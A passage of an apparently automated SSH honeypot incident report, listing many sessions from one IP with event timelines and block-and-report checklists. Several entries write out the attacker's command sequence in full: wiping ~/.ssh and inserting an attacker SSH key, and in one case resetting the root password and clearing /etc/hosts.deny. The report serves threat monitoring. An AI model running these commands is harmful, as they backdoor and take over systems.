- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5bb10ec4c45

| Field | Detail |
|---|---|
| **Source IP** | `101.126.55[.]67` |
| **First Seen** | 2026-05-14 18:49 |
| **Last Seen** | 2026-05-14 18:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 18:49:29` | `cowrie.session.connect` |
| `2026-05-14 18:49:29` | `cowrie.client.version` |
| `2026-05-14 18:49:29` | `cowrie.client.kex` |
| `2026-05-14 18:49:33` | `cowrie.login.success` |
| `2026-05-14 18:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.55[.]67` to AbuseIPDB if not already reported
- [ ] Block `101.126.55[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53cb5273f050

| Field | Detail |
|---|---|
| **Source IP** | `101.126.55[.]67` |
| **First Seen** | 2026-05-14 18:50 |
| **Last Seen** | 2026-05-14 18:50 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 18:50:01` | `cowrie.session.connect` |
| `2026-05-14 18:50:01` | `cowrie.client.version` |
| `2026-05-14 18:50:01` | `cowrie.client.kex` |
| `2026-05-14 18:50:04` | `cowrie.login.success` |
| `2026-05-14 18:50:05` | `cowrie.session.params` |
| `2026-05-14 18:50:05` | `cowrie.command.input` |
| `2026-05-14 18:50:05` | `cowrie.command.failed` |
| `2026-05-14 18:50:05` | `cowrie.log.closed` |
| `2026-05-14 18:50:05` | `cowrie.session.params` |
| `2026-05-14 18:50:05` | `cowrie.command.input` |
| `2026-05-14 18:50:05` | `cowrie.session.file_download` |
| `2026-05-14 18:50:05` | `cowrie.log.closed` |
| `2026-05-14 18:50:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.55[.]67` to AbuseIPDB if not already reported
- [ ] Block `101.126.55[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d9e3d66d5b4

| Field | Detail |
|---|---|
| **Source IP** | `101.126.55[.]67` |
| **First Seen** | 2026-05-14 18:50 |
| **Last Seen** | 2026-05-14 18:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 18:50:10` | `cowrie.session.connect` |
| `2026-05-14 18:50:10` | `cowrie.client.version` |
| `2026-05-14 18:50:10` | `cowrie.client.kex` |
| `2026-05-14 18:50:11` | `cowrie.login.success` |
| `2026-05-14 18:50:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.55[.]67` to AbuseIPDB if not already reported
- [ ] Block `101.126.55[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fe121e90028

| Field | Detail |
|---|---|
| **Source IP** | `101.126.55[.]67` |
| **First Seen** | 2026-05-14 18:50 |
| **Last Seen** | 2026-05-14 18:51 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:znfMuVg8YZOC"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 18:50:37` | `cowrie.session.connect` |
| `2026-05-14 18:50:37` | `cowrie.client.version` |
| `2026-05-14 18:50:37` | `cowrie.client.kex` |
| `2026-05-14 18:50:37` | `cowrie.login.success` |
| `2026-05-14 18:50:38` | `cowrie.session.params` |
| `2026-05-14 18:50:38` | `cowrie.command.input` |
| `2026-05-14 18:50:38` | `cowrie.command.failed` |
| `2026-05-14 18:50:38` | `cowrie.log.closed` |
| `2026-05-14 18:50:39` | `cowrie.session.params` |
| `2026-05-14 18:50:39` | `cowrie.command.input` |
| `2026-05-14 18:50:39` | `cowrie.session.file_download` |
| `2026-05-14 18:50:39` | `cowrie.log.closed` |
| `2026-05-14 18:50:48` | `cowrie.session.params` |
| `2026-05-14 18:50:48` | `cowrie.command.input` |
| `2026-05-14 18:50:49` | `cowrie.log.closed` |
| `2026-05-14 18:50:49` | `cowrie.session.params` |
| `2026-05-14 18:50:49` | `cowrie.command.input` |
| `2026-05-14 18:50:50` | `cowrie.log.closed` |
| `2026-05-14 18:50:53` | `cowrie.session.params` |
| `2026-05-14 18:50:53` | `cowrie.command.input` |
| `2026-05-14 18:50:53` | `cowrie.session.file_download` |
| `2026-05-14 18:50:53` | `cowrie.log.closed` |
| `2026-05-14 18:50:53` | `cowrie.session.params` |
| `2026-05-14 18:50:53` | `cowrie.command.input` |
| `2026-05-14 18:50:54` | `cowrie.log.closed` |
| `2026-05-14 18:50:54` | `cowrie.session.params` |
| `2026-05-14 18:50:54` | `cowrie.command.input` |
| `2026-05-14 18:50:55` | `cowrie.log.closed` |
| `2026-05-14 18:50:55` | `cowrie.session.params` |
| `2026-05-14 18:50:55` | `cowrie.command.input` |
| `2026-05-14 18:50:55` | `cowrie.command.input` |
| `2026-05-14 18:50:55` | `cowrie.log.closed` |
| `2026-05-14 18:51:01` | `cowrie.session.params` |
| `2026-05-14 18:51:01` | `cowrie.command.input` |
| `2026-05-14 18:51:02` | `cowrie.log.closed` |
| `2026-05-14 18:51:02` | `cowrie.session.params` |
| `2026-05-14 18:51:02` | `cowrie.command.input` |
| `2026-05-14 18:51:03` | `cowrie.log.closed` |
| `2026-05-14 18:51:03` | `cowrie.session.params` |
| `2026-05-14 18:51:03` | `cowrie.command.input` |
| `2026-05-14 18:51:03` | `cowrie.log.closed` |
| `2026-05-14 18:51:03` | `cowrie.session.params` |
| `2026-05-14 18:51:03` | `cowrie.command.input` |
| `2026-05-14 18:51:04` | `cowrie.log.closed` |
| `2026-05-14 18:51:04` | `cowrie.session.params` |
| `2026-05-14 18:51:04` | `cowrie.command.input` |
| `2026-05-14 18:51:04` | `cowrie.log.closed` |
| `2026-05-14 18:51:05` | `cowrie.session.params` |
| `2026-05-14 18:51:05` | `cowrie.command.input` |
| `2026-05-14 18:51:05` | `cowrie.log.closed` |
| `2026-05-14 18:51:05` | `cowrie.session.params` |
| `2026-05-14 18:51:05` | `cowrie.command.input` |
| `2026-05-14 18:51:05` | `cowrie.log.closed` |
| `2026-05-14 18:51:06` | `cowrie.session.params` |
| `2026-05-14 18:51:06` | `cowrie.command.input` |
| `2026-05-14 18:51:06` | `cowrie.log.closed` |
| `2026-05-14 18:51:06` | `cowrie.session.params` |
| `2026-05-14 18:51:06` | `cowrie.command.input` |
| `2026-05-14 18:51:06` | `cowrie.log.closed` |
| `2026-05-14 18:51:07` | `cowrie.session.params` |
| `2026-05-14 18:51:07` | `cowrie.command.input` |
| `2026-05-14 18:51:07` | `cowrie.log.closed` |
| `2026-05-14 18:51:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.55[.]67` to AbuseIPDB if not already reported
- [ ] Block `101.126.55[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de8be85c8c0a

| Field | Detail |
|---|---|
| **Source IP** | `101.126.55[.]67` |
| **First Seen** | 2026-05-14 18:51 |
| **Last Seen** | 2026-05-14 18:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 18:51:49` | `cowrie.session.connect` |
| `2026-05-14 18:51:49` | `cowrie.client.version` |
| `2026-05-14 18:51:49` | `cowrie.client.kex` |
| `2026-05-14 18:51:50` | `cowrie.login.success` |
| `2026-05-14 18:51:52` | `cowrie.session.params` |
| `2026-05-14 18:51:52` | `cowrie.command.input` |
| `2026-05-14 18:51:52` | `cowrie.command.failed` |
| `2026-05-14 18:51:52` | `cowrie.log.closed` |
| `2026-05-14 18:51:53` | `cowrie.session.params` |
| `2026-05-14 18:51:53` | `cowrie.command.input` |
| `2026-05-14 18:51:53` | `cowrie.session.file_download` |
| `2026-05-14 18:51:53` | `cowrie.log.closed` |
| `2026-05-14 18:51:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.55[.]67` to AbuseIPDB if not already reported
- [ ] Block `101.126.55[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0747e7372e03

| Field | Detail |
|---|---|
| **Source IP** | `101.126.55[.]67` |
| **First Seen** | 2026-05-14 18:51 |
| **Last Seen** | 2026-05-14 18:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 18:51:57` | `cowrie.session.connect` |
| `2026-05-14 18:51:57` | `cowrie.client.version` |
| `2026-05-14 18:51:57` | `cowrie.client.kex` |
| `2026-05-14 18:51:57` | `cowrie.login.success` |
| `2026-05-14 18:51:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.55[.]67` to AbuseIPDB if not already reported
- [ ] Block `101.126.55[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2812d07030bb

| Field | Detail |
|---|---|
| **Source IP** | `101.126.55[.]67` |
| **First Seen** | 2026-05-14 18:52 |
| **Last Seen** | 2026-05-14 18:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 18:52:26` | `cowrie.session.connect` |
| `2026-05-14 18:52:26` | `cowrie.client.version` |
| `2026-05-14 18:52:27` | `cowrie.client.kex` |
| `2026-05-14 18:52:28` | `cowrie.login.success` |
| `2026-05-14 18:52:28` | `cowrie.session.params` |
| `2026-05-14 18:52:28` | `cowrie.command.input` |
| `2026-05-14 18:52:28` | `cowrie.command.failed` |
| `2026-05-14 18:52:28` | `cowrie.log.closed` |
| `2026-05-14 18:52:29` | `cowrie.session.params` |
| `2026-05-14 18:52:29` | `cowrie.command.input` |
| `2026-05-14 18:52:29` | `cowrie.session.file_download` |
| `2026-05-14 18:52:29` | `cowrie.log.closed` |
| `2026-05-14 18:52:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.55[.]67` to AbuseIPDB if not already reported
- [ ] Block `101.126.55[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-067fca78d4a0

| Field | Detail |
|---|---|
| **Source IP** | `101.126.55[.]67` |
| **First Seen** | 2026-05-14 18:52 |
| **Last Seen** | 2026-05-14 18:52 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 18:52:33` | `cowrie.session.connect` |
| `2026-05-14 18:52:33` | `cowrie.client.version` |
| `2026-05-14 18:52:33` | `cowrie.client.kex` |
| `2026-05-14 18:52:34` | `cowrie.login.success` |
| `2026-05-14 18:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.55[.]67` to AbuseIPDB if not already reported
- [ ] Block `101.126.55[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93b3c5460615

| Field | Detail |
|---|---|
| **Source IP** | `101.126.55[.]67` |
| **First Seen** | 2026-05-14 18:53 |
| **Last Seen** | 2026-05-14 18:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 18:53:02` | `cowrie.session.connect` |
| `2026-05-14 18:53:02` | `cowrie.client.version` |
| `2026-05-14 18:53:02` | `cowrie.client.kex` |
| `2026-05-14 18:53:03` | `cowrie.login.success` |
| `2026-05-14 18:53:04` | `cowrie.session.params` |
| `2026-05-14 18:53:04` | `cowrie.command.input` |
| `2026-05-14 18:53:04` | `cowrie.command.failed` |
| `2026-05-14 18:53:04` | `cowrie.log.closed` |
| `2026-05-14 18:53:04` | `cowrie.session.params` |
| `2026-05-14 18:53:04` | `cowrie.command.input` |
| `2026-05-14 18:53:05` | `cowrie.session.file_download` |
| `2026-05-14 18:53:05` | `cowrie.log.closed` |
| `2026-05-14 18:53:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.55[.]67` to AbuseIPDB if not already reported
- [ ] Block `101.126.55[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f89ced9d696

| Field | Detail |
|---|---|
| **Source IP** | `101.126.55[.]67` |
| **First Seen** | 2026-05-14 18:53 |
| **Last Seen** | 2026-05-14 18:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 18:53:08` | `cowrie.session.connect` |
| `2026-05-14 18:53:08` | `cowrie.client.version` |
| `2026-05-14 18:53:09` | `cowrie.client.kex` |
| `2026-05-14 18:53:10` | `cowrie.login.success` |
| `2026-05-14 18:53:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.55[.]67` to AbuseIPDB if not already reported
- [ ] Block `101.126.55[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-305612ea5bed

| Field | Detail |
|---|---|
| **Source IP** | `101.126.55[.]67` |
| **First Seen** | 2026-05-14 18:54 |
| **Last Seen** | 2026-05-14 18:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 18:54:15` | `cowrie.session.connect` |
| `2026-05-14 18:54:15` | `cowrie.client.version` |
| `2026-05-14 18:54:15` | `cowrie.client.kex` |
| `2026-05-14 18:54:15` | `cowrie.login.success` |
| `2026-05-14 18:54:17` | `cowrie.session.params` |
| `2026-05-14 18:54:17` | `cowrie.command.input` |
| `2026-05-14 18:54:17` | `cowrie.command.failed` |
| `2026-05-14 18:54:17` | `cowrie.log.closed` |
| `2026-05-14 18:54:17` | `cowrie.session.params` |
| `2026-05-14 18:54:17` | `cowrie.command.input` |
| `2026-05-14 18:54:17` | `cowrie.session.file_download` |
| `2026-05-14 18:54:17` | `cowrie.log.closed` |
| `2026-05-14 18:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.55[.]67` to AbuseIPDB if not already reported
- [ ] Block `101.126.55[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b55e27b9706a

| Field | Detail |
|---|---|
| **Source IP** | `101.126.55[.]67` |
| **First Seen** | 2026-05-14 18:54 |
| **Last Seen** | 2026-05-14 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 18:54:20` | `cowrie.session.connect` |
| `2026-05-14 18:54:20` | `cowrie.client.version` |
| `2026-05-14 18:54:20` | `cowrie.client.kex` |
| `2026-05-14 18:54:21` | `cowrie.login.success` |
| `2026-05-14 18:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.55[.]67` to AbuseIPDB if not already reported
- [ ] Block `101.126.55[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4719f1355b96

| Field | Detail |
|---|---|
| **Source IP** | `101.126.55[.]67` |
| **First Seen** | 2026-05-14 18:54 |
| **Last Seen** | 2026-05-14 18:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 18:54:53` | `cowrie.session.connect` |
| `2026-05-14 18:54:53` | `cowrie.client.version` |
| `2026-05-14 18:54:53` | `cowrie.client.kex` |
| `2026-05-14 18:54:54` | `cowrie.login.success` |
| `2026-05-14 18:54:54` | `cowrie.session.params` |
| `2026-05-14 18:54:54` | `cowrie.command.input` |
| `2026-05-14 18:54:54` | `cowrie.command.failed` |
| `2026-05-14 18:54:55` | `cowrie.log.closed` |
| `2026-05-14 18:54:56` | `cowrie.session.params` |
| `2026-05-14 18:54:56` | `cowrie.command.input` |
| `2026-05-14 18:54:57` | `cowrie.session.file_download` |
| `2026-05-14 18:54:57` | `cowrie.log.closed` |
| `2026-05-14 18:55:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.55[.]67` to AbuseIPDB if not already reported
- [ ] Block `101.126.55[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-754e39d136d5

| Field | Detail |
|---|---|
| **Source IP** | `101.126.55[.]67` |
| **First Seen** | 2026-05-14 18:55 |
| **Last Seen** | 2026-05-14 18:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 18:55:00` | `cowrie.session.connect` |
| `2026-05-14 18:55:01` | `cowrie.client.version` |
| `2026-05-14 18:55:01` | `cowrie.client.kex` |
| `2026-05-14 18:55:02` | `cowrie.login.success` |
| `2026-05-14 18:55:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.55[.]67` to AbuseIPDB if not already reported
- [ ] Block `101.126.55[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-469c19940d1a

| Field | Detail |
|---|---|
| **Source IP** | `101.126.55[.]67` |
| **First Seen** | 2026-05-14 18:55 |
| **Last Seen** | 2026-05-14 18:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 18:55:29` | `cowrie.session.connect` |
| `2026-05-14 18:55:29` | `cowrie.client.version` |
